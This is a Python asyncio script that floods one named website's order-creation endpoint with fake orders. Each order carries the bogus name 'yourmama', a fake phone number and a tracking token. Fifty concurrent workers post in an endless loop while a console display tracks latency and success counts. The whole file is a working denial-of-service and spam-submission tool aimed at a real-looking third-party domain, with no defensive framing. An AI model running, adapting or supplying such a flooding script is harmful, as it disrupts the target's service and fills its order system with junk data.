import asyncio
import os
import sys
import time
import aiohttp
import threading

url = "https://ph6.macho-active.cc/order/create/"

data = {
    "name" :"yourmama",
    "phone": "091231231231",
    "esub": "-7EBRQCgQAAAePswEDQokDyJc3uW8BQAEAAw8ckaJjEQ0aEQ0iEQ1CEQ1aA1BIB2hrMn9hZGNvbWJv_2VHQnVFWkxPAANiaA"
}

finishedRequests = 0
successful = 0
failed = 0
ping = 0


async def worker(queue: asyncio.Queue):
    global successful
    global finishedRequests
    global failed
    global ping
    localFailed = 0
    while localFailed < 5:
        request: aiohttp.client._RequestContextManager = await queue.get()
        start = time.monotonic()
        res = await request
        elapsed = time.monotonic() - start
        ping = (ping + elapsed) / 2
        finishedRequests += 1
        if(res.status == 200):
            successful += 1
        else:
            failed += 1
            localFailed += 1
        
        queue.task_done()


async def draw():
    global successful
    global finishedRequests
    global failed
    global ping
    while True:
        os.system("CLS")
        print(f"Ping: {round(ping * 1000)}ms")
        print(f"Successful: {successful} / {finishedRequests} \nFailed: {failed} / {finishedRequests}")
        await asyncio.sleep(0.5)


async def main():
    queue = asyncio.Queue()
    num_of_workers = 50
    asyncio.create_task(draw())
    async with aiohttp.ClientSession() as client:
        while True:
             #draw to screen
            for _ in range(num_of_workers):
                queue.put_nowait(client.post(url=url, data=data))
            
            tasks: list[asyncio.Task] = []
            for i in range(num_of_workers):
                tasks.append(asyncio.create_task(worker(queue)))
            await queue.join()

            for task in tasks:
                task.cancel()
           
            await asyncio.sleep(0.1)


asyncio.run(main())